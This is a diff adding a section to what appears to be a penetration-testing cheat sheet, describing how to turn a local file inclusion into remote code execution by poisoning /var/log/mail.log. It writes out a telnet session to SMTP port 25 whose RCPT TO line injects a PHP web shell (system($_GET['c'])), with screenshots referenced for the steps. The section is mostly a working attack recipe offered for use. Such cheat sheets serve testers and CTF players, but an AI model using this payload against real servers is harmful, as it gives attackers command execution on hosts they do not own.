@@ -1223,6 +1223,28 @@ tar.close()
 
 ---------------
 
+### LFI2RCE with /var/log/mail.log
+
+- If you can read port `25` which is `smtp` log `/var/log/mail.log` via Local File Include.The payload below is url-encoded.
+
+![image](https://github.com/user-attachments/assets/257a535c-afcf-417b-bdb2-89cfb70550d5)
+
+- Then, connect to the port and use the details below.
+
+```bash
+telnet <ip> 25
+MAIL FROM:<toor@gmail.com>
+RCPT TO:<?php system($_GET['c']); ?>
+```
+
+![image](https://github.com/user-attachments/assets/3224f7ca-ac7e-4a6d-9a31-75575ac98ffd)
+
+- RCE-:
+
+![image](https://github.com/user-attachments/assets/70db8db3-5811-4074-bc70-e8a89b69d31e)
+
+--------------
+
 
 
 
